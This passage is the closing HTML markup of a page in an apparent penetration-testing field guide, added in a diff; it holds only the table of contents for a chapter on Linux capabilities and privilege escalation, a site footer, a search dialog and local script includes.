+    <nav class="g-toc-nav"><a class="g-toc-link depth-2" href="#linux-capabilities-for-privilege-escalation" data-toc-link>Linux Capabilities for Privilege Escalation</a><a class="g-toc-link depth-3" href="#1-understanding-linux-capabilities" data-toc-link>1. Understanding Linux Capabilities</a><a class="g-toc-link depth-3" href="#2-enumeration-finding-capabilities" data-toc-link>2. Enumeration: Finding Capabilities</a><a class="g-toc-link depth-3" href="#3-dangerous-capabilities-and-exploitation" data-toc-link>3. Dangerous Capabilities &amp; Exploitation</a><a class="g-toc-link depth-3" href="#4-capability-inheritance-exploitation" data-toc-link>4. Capability Inheritance Exploitation</a><a class="g-toc-link depth-3" href="#5-file-vs-running-process-capabilities" data-toc-link>5. File vs. Running Process Capabilities</a><a class="g-toc-link depth-3" href="#6-other-dangerous-capabilities" data-toc-link>6. Other Dangerous Capabilities</a><a class="g-toc-link depth-3" href="#7-practical-exploitation-workflow" data-toc-link>7. Practical Exploitation Workflow</a><a class="g-toc-link depth-3" href="#8-automated-tools" data-toc-link>8. Automated Tools</a><a class="g-toc-link depth-3" href="#9-defensive-measures" data-toc-link>9. Defensive Measures</a></nav>
+    <div class="g-toc-foot">Part 03 / 10 sections</div>
+  </div>
+</aside>
+</div>
+<footer class="g-site-foot g-docs-foot">
+  <div class="g-foot-main">
+    <span>0XMAP field guide / 30 chapters / 2 companion handbooks</span>
+    <span>Created by 0xbit</span>
+  </div>
+  <div class="g-foot-links">
+    <a href="../index.html">Home</a>
+    <a href="../index.html#foundations">Foundations</a>
+    <a href="../index.html#privesc">Privilege escalation</a>
+    <a href="../index.html#chapters">Chapters</a>
+    <button type="button" class="g-link-btn" data-search-open>Search</button>
+  </div>
+</footer>
+  
+<div class="g-search" data-search-modal hidden>
+  <div class="g-search-panel" role="dialog" aria-modal="true" aria-labelledby="g-search-title">
+    <div class="g-search-top">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+      <label class="g-visually-hidden" for="g-search-input" id="g-search-title">Search the guide</label>
+      <input class="g-search-input" id="g-search-input" data-search-input type="search"
+             placeholder="Search chapters, handbooks and commands..." autocomplete="off" spellcheck="false">
+      <kbd>Esc</kbd>
+      <button type="button" class="g-icon-btn" data-search-close aria-label="Close search">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+      </button>
+    </div>
+    <div class="g-search-results" data-search-results></div>
+    <div class="g-search-foot">
+      <span><kbd>Up</kbd><kbd>Down</kbd> to move</span>
+      <span><kbd>Enter</kbd> to open</span>
+      <span data-search-count></span>
+    </div>
+  </div>
+</div>
+  <script src="../static/guide-data.js"></script>
+  <script src="../static/guide.js" defer></script>
+</body>
+</html>
